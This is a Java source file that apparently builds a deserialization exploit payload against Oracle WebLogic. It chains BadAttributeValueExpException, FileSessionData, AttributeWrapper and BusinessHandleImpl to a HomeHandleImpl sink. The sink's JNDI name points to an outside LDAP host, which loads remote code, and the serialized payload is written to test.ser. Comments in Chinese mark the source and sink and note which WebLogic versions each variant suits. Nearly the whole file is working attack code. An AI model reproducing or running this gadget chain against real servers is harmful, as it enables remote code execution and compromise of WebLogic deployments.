package com.pocs.test;

import weblogic.ejb.container.internal.BusinessHandleImpl;
import weblogic.ejb20.internal.HomeHandleImpl;
import weblogic.servlet.internal.AttributeWrapper;
import weblogic.servlet.internal.session.FileSessionData;
import weblogic.servlet.internal.session.SessionData;
//import ysoserial.jdk8.util.Serializables;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompoundName;
import javax.naming.Name;
//import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.ConcurrentHashMap;

public class test2 {
    public static void main(String[] args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "true");
        // 构造HomeHandleImpl，sink点
        HomeHandleImpl homeHandle = new HomeHandleImpl();
        Field serverURLF = homeHandle.getClass().getDeclaredField("serverURL");
        serverURLF.setAccessible(true);
        serverURLF.set(homeHandle, "t3://127.0.0.1:7001");

        Properties props = new Properties();
        Name name = new CompoundName("ldap://docker.for.mac.localhost:1389/UpX34defineClass",props);
        Field jndiNameF = homeHandle.getClass().getDeclaredField("jndiName");
        jndiNameF.setAccessible(true);
        jndiNameF.set(homeHandle, name);

// homeHandle设置到BusinessHandleImpl
        BusinessHandleImpl businessHandle = new BusinessHandleImpl();
        Field homeHandleF = businessHandle.getClass().getDeclaredField("homeHandle");
        homeHandleF.setAccessible(true);
        homeHandleF.set(businessHandle, homeHandle);

//10.3.6
//Constructor ejbAttributeWrapperC = Class.forName("weblogic.servlet.internal.session.EJBAttributeWrapper").getDeclaredConstructor(BusinessHandle.class);
//ejbAttributeWrapperC.setAccessible(true);
//Object attributeWrapper = ejbAttributeWrapperC.newInstance(businessHandle);

// 12.1.3以上
        AttributeWrapper attributeWrapper =  new AttributeWrapper(businessHandle);
        attributeWrapper.setEJBObjectWrapped(true);


        Map map = new ConcurrentHashMap();
        map.put("wl_debug_session", attributeWrapper);


        SessionData sessionData = new FileSessionData();
        Field attributesF = sessionData.getClass().getSuperclass().getDeclaredField("attributes");
        attributesF.setAccessible(true);
        attributesF.set(sessionData,map);

// source
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, sessionData);
        serialize(badAttributeValueExpException);
//        byte []xx=Serializables.serialize(badAttributeValueExpException);
//        serialize2(xx);
    }
    public static void serialize2(byte []data) throws Exception {
        FileOutputStream fo = new FileOutputStream("test.ser");
        fo.write(data);
        fo.close();
    }
    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.flush();
            os.close();
            System.out.println("ok");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
